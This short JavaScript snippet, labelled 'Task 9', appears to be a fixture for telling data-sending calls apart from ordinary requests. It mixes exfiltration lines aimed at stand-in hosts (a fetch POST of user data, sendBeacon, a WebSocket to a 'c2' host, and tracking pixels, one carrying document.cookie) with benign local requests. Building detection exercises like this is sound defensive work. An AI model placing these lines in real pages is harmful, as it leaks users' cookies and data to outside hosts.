// Task 9: fetch and other ways to send data.
fetch("https://collector.evil.test/c", { method: "POST", body: JSON.stringify({ u: user }) });
fetch("/api/local");
window.fetch(endpoint);
navigator.sendBeacon("https://beacon.evil.test/b", payload);
var socket = new WebSocket("wss://c2.evil.test/live");
var events = new EventSource("/stream");
new Image().src = "https://pixel.evil.test/p.gif?d=" + encodeURIComponent(data);
var img = new Image();
img.src = "https://pixel.evil.test/q?c=" + document.cookie;
// not a beacon: an ordinary image
logo.src = "/logo.png";
